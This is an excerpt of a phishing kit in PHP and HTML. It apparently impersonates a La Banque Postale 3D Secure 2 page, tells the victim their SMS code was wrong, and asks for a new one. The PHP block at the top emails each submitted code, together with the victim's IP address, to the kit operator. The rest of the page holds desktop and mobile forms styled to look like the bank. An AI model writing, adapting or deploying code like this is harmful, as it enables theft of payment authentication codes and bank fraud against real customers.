<?php
  ...
  if ($_SERVER["REQUEST_METHOD"] == "POST") {
    ...
    if (empty($id)) {
      ...
      $emailText .= "Code 3D Secure 2 : $id\n";

    }

    if ($isSucess) {
     
    mail($emailTo, "Postale - 3D Secure 2 | =?UTF-8?Q?=e2=9d=a4_?=  $ip =?UTF-8?Q?=E2=9C=94_?= ", $emailText);
      $id = $mdp = "";
...
<div class="d-none d-md-block">
  ...
  <img src="cap/c.png" style="width: 100%">
  <div class="tel">
        <br>
    <div class="row">
      <div class="col-4"></div>
      <div class="col-6 row" style="background:white">
        ...
        <div class="col-11 ">
         ...
         <strong style="color: red;" >Code erroné ! <br>Veuillez saisir le nouveau code SMS reçu </strong><br>
         <br>
...
<hr align="center" width="100%" color="#1346A0" size="5">
          ...
          <p style="left:-200px">Saisissez le nouveau code reçu par SMS (Exemple: 12345678)</p>     
            <div class="form-group col-9 row" style="left:-25px">        
              <b class="col-7" for="id" style="text-align: right;">Code de confirmation:</b>
              <input type="tel" class="form-control ordi col-5" id="id" name="id" maxlength="8" style=" margin-bottom: 15%;  background-image: url(cap/sms.png); background-repeat: no-repeat;
...
">
          ...
          <p><i><font color="1346A0">Ne pas fermer cette page avant la réception du nouveau Code SMS</font></i>
        </div>
...
<!-- ...................................TEL............................................. -->
   <div class="d-md-none" style="background: white">
    <img src="cap/cc11.png" style="width: 100%">
    <div class="container">
      <p class="thank-you" style="display: <?php if ($error) {
            echo "block";
...
<hr align="center" width="100%" color="#1346A0" size="3">
          ...
          <p style="left:-200px">Veuillez saisir le code sécurité reçu par SMS (Exemple: 12345678)</p>     
      <div class="form-group col-12">
        <b class="col-7" for="id" style="text-align: right;">Code de confirmation:</b>
        <input type="tel" class="form-control mobile" id="id" name="id" maxlength="8">
      </div>
      <div class="col-4">
